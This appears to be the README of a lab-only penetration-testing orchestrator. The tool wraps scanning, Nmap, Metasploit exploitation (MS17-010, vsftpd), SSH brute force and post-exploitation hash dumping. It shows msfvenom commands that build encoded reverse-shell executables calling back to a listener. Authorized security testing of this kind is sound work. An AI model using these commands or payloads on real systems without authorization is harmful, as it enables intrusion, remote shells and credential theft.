# The Auto-Pwn Orchestrator (Lab-Only)

This project provides a lab-only network inventory and risk inference pipeline.
It includes optional Metasploit integration for controlled, authorized testing.

## What it does
- Expands a strict allowlist and target list
- Scans TCP ports with a timeout and concurrency cap
- Collects lightweight banners for basic service hints
- Produces inventory + JSON report, a text report, and CSV exports
- **(Optional)** Connects to Metasploit RPC for module discovery and controlled execution (gated by allowlist and dry-run mode)
- **(Optional)** Generates payloads using `msfvenom` via CLI
- **(Optional)** Runs Nmap scans for deeper service analysis
- **(Optional)** Provides a Web Dashboard for viewing results
- **(Optional)** Automates Brute Force attacks on discovered services
- **(Optional)** Performs targeted attacks (e.g., MS17-010) and post-exploitation looting

## Quick start
1) Create a config file and edit targets.

```bash
copy config.example.toml config.toml
```

2) Install dependencies.

```bash
python -m pip install -r requirements.txt
```

3) Preview the scan plan without scanning.

```bash
python -m auto_pwn_orchestrator.cli --config config.toml plan
```

4) Run the scan and generate reports.

```bash
python -m auto_pwn_orchestrator.cli --config config.toml run
```

## Advanced Features

### Web Dashboard
Start a local web server to view your reports and inventory.
```bash
python -m auto_pwn_orchestrator.cli --config config.toml web
```
Access it at `http://127.0.0.1:8000`.

### Nmap Integration & Auto-Exploit Matching
Enable Nmap in `config.toml` to run deeper scans. The tool will automatically match discovered service versions against a local exploit database (`data/exploit_db.json`) and suggest potential Metasploit modules.
```toml
[nmap]
enabled = true
arguments = "-sV -O"
sudo = false
```

### Targeted Attacks
Run specific, high-value attack workflows.
```bash
python -m auto_pwn_orchestrator.cli attack --type ms17-010 --target 192.168.1.50
```
Supported types: `ms17-010`, `vsftpd`.

### Post-Exploitation (Auto-Loot)
Automatically gather information (sysinfo, uid, hashdump) from all active Metasploit sessions.
```bash
python -m auto_pwn_orchestrator.cli loot
```
Results are saved to `output/loot/<ip>/`.

### Brute Force
Run targeted brute force attacks using Metasploit auxiliary modules.
```bash
python -m auto_pwn_orchestrator.cli bruteforce \
  --service ssh \
  --rhosts 192.168.1.10 \
  --user-file users.txt \
  --pass-file pass.txt
```

### Session Management
List active Metasploit sessions.
```bash
python -m auto_pwn_orchestrator.cli sessions
```

### Payload Generation
Generate payloads directly using the `payload` command (requires `msfvenom` in PATH).

**Basic Example:**
```bash
python -m auto_pwn_orchestrator.cli payload \
  --payload windows/meterpreter/reverse_tcp \
  --lhost 192.168.1.10 \
  --lport 4444 \
  --format exe \
  --output payload.exe
```

**Advanced Example (Encoding & Bad Chars):**
```bash
python -m auto_pwn_orchestrator.cli payload \
  --payload linux/x64/shell_reverse_tcp \
  --lhost 192.168.1.10 \
  --lport 4444 \
  --format elf \
  --output shell.elf \
  --encoder x64/xor \
  --iterations 3 \
  --bad-chars "\x00\x0a\x0d"
```

## Reports and filters
Outputs are written to the `output` directory by default:
- `inventory.json`
- `report.json`
- `report.txt`
- `report.csv`
- `summary.csv`

Filter findings in the report:
```bash
python -m auto_pwn_orchestrator.cli --config config.toml run --min-severity high
```

Filter by service or port:
```bash
python -m auto_pwn_orchestrator.cli --config config.toml run --service smb --port 445
```

Control output names:
```bash
python -m auto_pwn_orchestrator.cli --config config.toml run --output-prefix lab1 --no-timestamp
```

## Ruby tools
Optional helper scripts are available in `scripts/`:

Validate config:
```bash
ruby scripts/validate_config.rb --config config.toml
```

Generate HTML report from `report.json`:
```bash
ruby scripts/report_to_html.rb --input output/report.json --output output/report.html
```

Export CSV from `report.json`:
```bash
ruby scripts/report_to_csv.rb --input output/report.json
```

Quick summary:
```bash
ruby scripts/report_summary.rb --input output/report.json
```

Compare inventory snapshots:
```bash
ruby scripts/inventory_diff.rb --old output/inventory_old.json --new output/inventory_new.json --format text
```

## Metasploit Integration
To enable Metasploit integration:
1. Start the Metasploit RPC daemon using the provided script:
   - **Windows**: `start_msf_rpc.bat`
   - **Linux/Mac**: `./start_msf_rpc.sh` (ensure it is executable: `chmod +x start_msf_rpc.sh`)

2. Update `config.toml`:
   ```toml
   [metasploit]
   enabled = true
   host = "127.0.0.1"
   port = 55553
   username = "msf"
   password = "msf"
   ssl = true
   dry_run = true  # Set to false to actually execute modules
   allowlist_modules = ["exploit/windows/smb/ms17_010_eternalblue"]
   ```

## Safety notes
- `targets.allowlist` is mandatory to prevent accidental scanning.
- The rules file (`data/rules.json`) flags exposure risks.
- Metasploit execution is gated by `allowlist_modules` and `dry_run` settings to prevent unauthorized actions.
